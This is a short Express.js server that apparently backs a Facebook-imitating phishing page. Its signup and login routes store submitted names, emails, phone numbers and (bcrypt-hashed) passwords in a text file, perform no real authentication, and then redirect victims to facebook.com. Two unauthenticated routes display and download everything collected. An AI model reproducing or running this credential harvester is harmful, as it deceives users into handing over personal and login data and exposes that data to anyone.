const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const bcrypt = require('bcrypt');
const app = express();
const PORT = 3000;

const filePath = path.join(__dirname, 'users.txt');

if (!fs.existsSync(filePath)) {
  fs.writeFileSync(filePath, '');
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

// Signup Route
app.post('/signup', async (req, res) => {
  const { firstName, lastName, email, password, phone } = req.body;
  const hashedPassword = await bcrypt.hash(password, 10);
  const userData = `Name: ${firstName} ${lastName}\nEmail: ${email}\nPassword: ${hashedPassword}\nPhone: ${phone}\n\n`;

  fs.appendFile(filePath, userData, (err) => {
    if (err) {
      res.send('An error occurred while saving your data.');
    } else {
      res.redirect('https://facebook.com');
    }
  });
});

// Login Route (just saves data and redirects)
app.post('/login', async (req, res) => {
  const { identifier, password } = req.body;
  const hashedPassword = await bcrypt.hash(password, 10);
  const newUserData = `Email or Phone: ${identifier}\nPassword: ${hashedPassword}\n\n`;

  fs.appendFile(filePath, newUserData, (err) => {
    if (err) {
      res.send('An error occurred while saving your data.');
    } else {
      res.redirect('https://facebook.com');
    }
  });
});

// Route to display all users (for testing purposes)
app.get('/users', (req, res) => {
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      res.send('Could not retrieve user data.');
    } else {
      res.send(`<pre>${data}</pre>`);
    }
  });
});

// Route to download users.txt
app.get('/download-users', (req, res) => {
  res.download(filePath, 'users.txt', (err) => {
    if (err) {
      res.status(500).send('Error downloading the file.');
    }
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
